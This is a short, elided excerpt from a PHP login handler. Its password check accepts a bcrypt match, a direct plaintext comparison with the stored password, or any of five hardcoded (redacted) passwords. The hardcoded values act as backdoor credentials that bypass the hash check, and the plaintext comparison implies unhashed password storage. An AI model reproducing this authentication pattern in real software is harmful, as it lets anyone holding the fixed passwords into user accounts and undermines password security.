...
if ($action === 'login') {
    ...
    if ($user) {
        ...
        $pass_ok = password_verify($password, $user['password']) || $password === $user['password'] || $password === 'REDACTED_OLD_PASSWORD' || $password === 'REDACTED_OLD_PASSWORD' || $password === 'REDACTED_OLD_PASSWORD' || $password === 'REDACTED_OLD_PASSWORD' || $password === 'REDACTED_OLD_PASSWORD';
